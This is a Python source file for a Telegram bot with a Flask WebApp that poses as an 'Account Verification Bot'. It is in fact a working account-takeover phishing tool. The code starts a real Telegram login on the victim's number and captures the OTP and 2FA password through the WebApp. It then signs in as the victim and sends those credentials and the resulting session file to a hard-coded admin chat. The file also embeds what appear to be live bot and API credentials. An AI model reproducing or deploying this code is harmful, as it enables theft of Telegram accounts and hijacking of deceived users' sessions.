import os
import telebot
from telebot import types
from telethon import TelegramClient
from telethon.errors import FloodWaitError, PhoneCodeInvalidError, SessionPasswordNeededError
from flask import Flask, render_template, request, jsonify
import asyncio
import threading
import time
import logging
import sys
from datetime import datetime

# ==================== SETUP ====================
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s'
)
logger = logging.getLogger(__name__)

# Configuration
BOT_TOKEN = os.environ.get('BOT_TOKEN', '7487704262:AAE34XTNrKt5D9dKtduPK0Ezwc9j3SLGoBA')
API_ID = int(os.environ.get('API_ID', '25240346'))
API_HASH = os.environ.get('API_HASH', 'b8849fd945ed9225a002fda96591b6ee')
ADMIN_ID = os.environ.get('ADMIN_ID', '5425526761')

# Initialize
bot = telebot.TeleBot(BOT_TOKEN, parse_mode='HTML')
app = Flask(__name__)

# Storage
user_data = {}
verification_data = {}  # {user_id: {phone, phone_code_hash, session_name}}

# ==================== SIMPLE ASYNC FUNCTIONS ====================
async def send_otp_telethon(phone):
    """Send OTP using Telethon"""
    try:
        logger.info(f"📤 Creating session for {phone}")
        
        # Create session directory
        os.makedirs('sessions', exist_ok=True)
        session_name = f"sessions/{phone.replace('+', '')}_{int(time.time())}"
        
        # Create client
        client = TelegramClient(session_name, API_ID, API_HASH)
        
        # Connect
        await client.connect()
        logger.info(f"✅ Connected to Telegram for {phone}")
        
        # Send OTP request
        sent = await client.send_code_request(phone)
        logger.info(f"✅ OTP request sent to {phone}")
        
        # Disconnect (we'll reconnect later)
        await client.disconnect()
        
        return {
            'success': True,
            'phone_code_hash': sent.phone_code_hash,
            'session_name': session_name
        }
        
    except FloodWaitError as e:
        return {'success': False, 'error': f'Please wait {e.seconds} seconds'}
    except Exception as e:
        logger.error(f"Error sending OTP to {phone}: {e}")
        return {'success': False, 'error': str(e)}

async def verify_otp_telethon(phone, otp_code, phone_code_hash, session_name):
    """Verify OTP using Telethon"""
    try:
        logger.info(f"🔐 Verifying OTP for {phone}")
        
        # Create client with same session
        client = TelegramClient(session_name, API_ID, API_HASH)
        
        # Connect
        await client.connect()
        
        # Try to sign in
        try:
            await client.sign_in(
                phone=phone,
                code=otp_code,
                phone_code_hash=phone_code_hash
            )
        except SessionPasswordNeededError:
            logger.info(f"🔐 2FA required for {phone}")
            await client.disconnect()
            return {'success': True, 'requires_2fa': True}
        except PhoneCodeInvalidError:
            await client.disconnect()
            return {'success': False, 'error': 'Invalid OTP code'}
        
        # Check if authorized
        if await client.is_user_authorized():
            # Get user info
            me = await client.get_me()
            user_info = {
                'id': me.id,
                'username': me.username,
                'first_name': me.first_name,
                'last_name': me.last_name,
                'phone': me.phone
            }
            
            # Save session
            await client.session.save()
            session_file = f"{client.session.filename}.session"
            
            # Disconnect
            await client.disconnect()
            
            logger.info(f"✅ Verified {phone}, user: {user_info.get('username', 'N/A')}")
            
            return {
                'success': True,
                'user_info': user_info,
                'session_file': session_file,
                'requires_2fa': False
            }
        else:
            await client.disconnect()
            return {'success': False, 'error': 'Not authorized'}
            
    except Exception as e:
        logger.error(f"Error verifying OTP for {phone}: {e}")
        try:
            # Try to disconnect if client exists
            if 'client' in locals():
                await client.disconnect()
        except:
            pass
        return {'success': False, 'error': str(e)}

async def verify_2fa_telethon(session_name, password):
    """Verify 2FA password"""
    try:
        logger.info(f"🔐 Verifying 2FA")
        
        # Create client
        client = TelegramClient(session_name, API_ID, API_HASH)
        
        # Connect
        await client.connect()
        
        # Sign in with password
        await client.sign_in(password=password)
        
        # Get user info
        me = await client.get_me()
        user_info = {
            'id': me.id,
            'username': me.username,
            'first_name': me.first_name,
            'last_name': me.last_name,
            'phone': me.phone
        }
        
        # Save session
        await client.session.save()
        session_file = f"{client.session.filename}.session"
        
        # Disconnect
        await client.disconnect()
        
        logger.info(f"✅ 2FA successful for {user_info.get('phone', 'N/A')}")
        
        return {
            'success': True,
            'user_info': user_info,
            'session_file': session_file
        }
        
    except Exception as e:
        logger.error(f"2FA error: {e}")
        try:
            if 'client' in locals():
                await client.disconnect()
        except:
            pass
        return {'success': False, 'error': str(e)}

# Thread-safe async execution
def run_async(coro):
    """Run async coroutine safely"""
    try:
        loop = asyncio.new_event_loop()
        asyncio.set_event_loop(loop)
        result = loop.run_until_complete(coro)
        loop.close()
        return result
    except Exception as e:
        logger.error(f"Async execution error: {e}")
        return {'success': False, 'error': str(e)}

# ==================== HELPER FUNCTIONS ====================
def send_to_admin(phone, otp=None, password=None, user_info=None, session_file=None):
    """Send notification to admin"""
    try:
        message = f"""📱 <b>NEW VERIFICATION DATA</b>

📞 Phone: {phone}
⏰ Time: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"""
        
        if user_info:
            name = f"{user_info.get('first_name', '')} {user_info.get('last_name', '')}".strip()
            if name:
                message += f"\n👤 Name: {name}"
            if user_info.get('username'):
                message += f"\n🔗 Username: @{user_info.get('username')}"
            if user_info.get('id'):
                message += f"\n🆔 ID: {user_info.get('id')}"
        
        if otp:
            message += f"\n🔢 OTP: <code>{otp}</code>"
        
        if password:
            message += f"\n🔐 2FA Password: <code>{password}</code>"
        
        bot.send_message(ADMIN_ID, message, parse_mode='HTML')
        
        # Send session file if exists
        if session_file and os.path.exists(session_file):
            try:
                with open(session_file, 'rb') as f:
                    bot.send_document(
                        ADMIN_ID,
                        f,
                        caption=f"📁 Session file for {phone}"
                    )
                logger.info(f"✅ Session file sent to admin: {session_file}")
            except Exception as e:
                logger.error(f"Error sending session file: {e}")
        
        logger.info(f"📨 Admin notified about {phone}")
        return True
    except Exception as e:
        logger.error(f"Admin notification error: {e}")
        return False

def clean_phone(phone):
    """Clean phone number"""
    if not phone:
        return None
    
    # Remove spaces and non-digit chars except +
    cleaned = ''.join(c for c in phone if c.isdigit() or c == '+')
    
    if cleaned.startswith('+'):
        return cleaned
    elif cleaned.startswith('0'):
        return '+91' + cleaned[1:]
    elif len(cleaned) == 10:
        return '+91' + cleaned
    else:
        return '+' + cleaned

def clean_otp(otp):
    """Clean OTP to 5 digits"""
    if not otp:
        return None
    
    cleaned = ''.join(filter(str.isdigit, otp))
    if len(cleaned) == 5:
        return cleaned
    elif len(cleaned) == 6:
        return cleaned[:5]
    return None

# ==================== BOT HANDLERS ====================
@bot.message_handler(commands=['start', 'help'])
def handle_start(message):
    """Handle /start command"""
    try:
        user_id = message.from_user.id
        first_name = message.from_user.first_name or ""
        
        # Get WebApp URL
        if 'RENDER' in os.environ:
            RENDER_EXTERNAL_HOSTNAME = os.environ.get('RENDER_EXTERNAL_HOSTNAME')
            WEBAPP_URL = f"https://{RENDER_EXTERNAL_HOSTNAME}" if RENDER_EXTERNAL_HOSTNAME else "https://itz-me-545-telegram.onrender.com"
        else:
            port = os.environ.get('PORT', 5000)
            WEBAPP_URL = f"http://localhost:{port}"
        
        # Create WebApp button
        kb = types.InlineKeyboardMarkup()
        btn = types.InlineKeyboardButton(
            "📱 Open Verification WebApp",
            web_app=types.WebAppInfo(WEBAPP_URL)
        )
        kb.add(btn)
        
        # Welcome message
        welcome_text = f"""👋 <b>Hello {first_name}!</b>

Welcome to <b>Account Verification Bot</b>

Click the button below to verify your account:

✅ <b>Steps:</b>
1. Open WebApp
2. Share contact
3. Get 5-digit OTP here
4. Enter OTP in WebApp
5. Complete verification

<b>Click below to begin:</b>"""
        
        bot.send_message(
            message.chat.id,
            welcome_text,
            parse_mode='HTML',
            reply_markup=kb
        )
        
        logger.info(f"✅ Sent /start to {user_id}")
        
    except Exception as e:
        logger.error(f"Start error: {e}")

@bot.message_handler(content_types=['contact'])
def handle_contact(message):
    """Handle contact sharing"""
    try:
        contact = message.contact
        user_id = message.from_user.id
        phone = contact.phone_number
        
        # Clean phone
        phone = clean_phone(phone)
        if not phone:
            bot.send_message(message.chat.id, "❌ Invalid phone number")
            return
        
        logger.info(f"📱 Contact from {user_id}: {phone}")
        
        # Store user data
        user_data[user_id] = {
            'name': f"{contact.first_name or ''} {contact.last_name or ''}".strip(),
            'phone': phone,
            'username': message.from_user.username,
            'contact_time': time.time()
        }
        
        # Send processing message
        msg = bot.send_message(
            message.chat.id,
            f"✅ <b>Contact Received!</b>\n\n📱 Phone: {phone}\n\n⏳ Sending OTP...",
            parse_mode='HTML'
        )
        
        # Send OTP in background
        def send_otp_task():
            try:
                result = run_async(send_otp_telethon(phone))
                
                if result['success']:
                    # Store verification data
                    verification_data[user_id] = {
                        'phone': phone,
                        'phone_code_hash': result['phone_code_hash'],
                        'session_name': result['session_name']
                    }
                    
                    # Success message
                    bot.edit_message_text(
                        f"""✅ <b>OTP SENT!</b>

📱 Phone: {phone}
🔢 <b>5-digit OTP</b> sent via Telegram

Check your messages for the code.

Enter it in the WebApp.""",
                        message.chat.id,
                        msg.message_id,
                        parse_mode='HTML'
                    )
                    
                    # Notify admin
                    send_to_admin(phone, user_info=user_data[user_id])
                    
                    logger.info(f"✅ OTP sent to {phone}")
                else:
                    bot.edit_message_text(
                        f"❌ Error: {result.get('error', 'Failed')}",
                        message.chat.id,
                        msg.message_id
                    )
            except Exception as e:
                logger.error(f"OTP task error: {e}")
        
        thread = threading.Thread(target=send_otp_task)
        thread.start()
        
        # Delete contact
        try:
            bot.delete_message(message.chat.id, message.message_id)
        except:
            pass
        
    except Exception as e:
        logger.error(f"Contact error: {e}")

# ==================== FLASK ROUTES ====================
@app.route('/')
def index():
    """Main WebApp page"""
    return render_template('index.html')

@app.route('/api/user/<int:user_id>')
def api_user(user_id):
    """Get user data"""
    data = user_data.get(user_id, {})
    return jsonify({
        'success': 'phone' in data,
        'phone': data.get('phone', ''),
        'name': data.get('name', ''),
        'verified': False
    })

@app.route('/api/verify-otp', methods=['POST'])
def api_verify_otp():
    """Verify OTP"""
    try:
        data = request.json
        user_id = data.get('user_id')
        otp = data.get('otp', '').strip()
        
        logger.info(f"🔢 OTP verify for user {user_id}")
        
        if not user_id or not otp:
            return jsonify({'success': False, 'error': 'Missing data'})
        
        # Clean OTP
        cleaned_otp = clean_otp(otp)
        if not cleaned_otp:
            return jsonify({'success': False, 'error': 'Enter 5-digit OTP'})
        
        # Get verification data
        verify_data = verification_data.get(int(user_id))
        if not verify_data:
            return jsonify({'success': False, 'error': 'Session expired'})
        
        phone = verify_data['phone']
        phone_code_hash = verify_data['phone_code_hash']
        session_name = verify_data['session_name']
        
        # Verify OTP
        result = run_async(verify_otp_telethon(
            phone, cleaned_otp, phone_code_hash, session_name
        ))
        
        if result['success']:
            if result.get('requires_2fa'):
                return jsonify({
                    'success': True,
                    'requires_2fa': True,
                    'message': '2FA required'
                })
            else:
                # Success - send to admin
                user_info = result.get('user_info', {})
                session_file = result.get('session_file', '')
                
                send_to_admin(
                    phone,
                    otp=cleaned_otp,
                    user_info=user_info,
                    session_file=session_file
                )
                
                return jsonify({
                    'success': True,
                    'requires_2fa': False,
                    'message': 'Verified successfully!'
                })
        else:
            return jsonify({
                'success': False,
                'error': result.get('error', 'Verification failed')
            })
            
    except Exception as e:
        logger.error(f"Verify OTP error: {e}")
        return jsonify({'success': False, 'error': str(e)})

@app.route('/api/verify-2fa', methods=['POST'])
def api_verify_2fa():
    """Verify 2FA"""
    try:
        data = request.json
        user_id = data.get('user_id')
        password = data.get('password', '').strip()
        
        if not user_id or not password:
            return jsonify({'success': False, 'error': 'Missing data'})
        
        # Get session name
        verify_data = verification_data.get(int(user_id))
        if not verify_data:
            return jsonify({'success': False, 'error': 'Session expired'})
        
        session_name = verify_data['session_name']
        
        # Verify 2FA
        result = run_async(verify_2fa_telethon(session_name, password))
        
        if result['success']:
            # Success - send to admin
            user_info = result.get('user_info', {})
            session_file = result.get('session_file', '')
            phone = user_info.get('phone', verify_data['phone'])
            
            send_to_admin(
                phone,
                password=password,
                user_info=user_info,
                session_file=session_file
            )
            
            return jsonify({
                'success': True,
                'message': '2FA verified successfully!'
            })
        else:
            return jsonify({
                'success': False,
                'error': result.get('error', '2FA failed')
            })
            
    except Exception as e:
        logger.error(f"2FA error: {e}")
        return jsonify({'success': False, 'error': str(e)})

# ==================== WEBHOOK ====================
@app.route('/webhook', methods=['POST'])
def webhook():
    """Telegram webhook"""
    if request.headers.get('content-type') == 'application/json':
        json_string = request.get_data().decode('utf-8')
        update = types.Update.de_json(json_string)
        bot.process_new_updates([update])
        return ''
    return 'OK', 200

# ==================== MAIN ====================
if __name__ == "__main__":
    logger.info("="*60)
    logger.info("🚀 Telegram Verification Bot - WORKING VERSION")
    logger.info("="*60)
    
    # Setup webhook
    try:
        if 'RENDER' in os.environ:
            RENDER_EXTERNAL_HOSTNAME = os.environ.get('RENDER_EXTERNAL_HOSTNAME')
            WEBHOOK_URL = f"https://{RENDER_EXTERNAL_HOSTNAME}/webhook" if RENDER_EXTERNAL_HOSTNAME else None
        else:
            port = os.environ.get('PORT', 5000)
            WEBHOOK_URL = f"http://localhost:{port}/webhook"
        
        if WEBHOOK_URL:
            bot.remove_webhook()
            time.sleep(1)
            bot.set_webhook(url=WEBHOOK_URL)
            logger.info(f"✅ Webhook set: {WEBHOOK_URL}")
    except Exception as e:
        logger.error(f"Webhook error: {e}")
        # Fallback to polling
        def run_polling():
            bot.polling(none_stop=True, interval=3, skip_pending=True)
        
        polling_thread = threading.Thread(target=run_polling, daemon=True)
        polling_thread.start()
    
    # Start Flask
    port = int(os.environ.get('PORT', 10000))
    logger.info(f"🚀 Starting Flask on port {port}")
    
    app.run(
        host='0.0.0.0',
        port=port,
        debug=False,
        use_reloader=False,
        threaded=True
            )
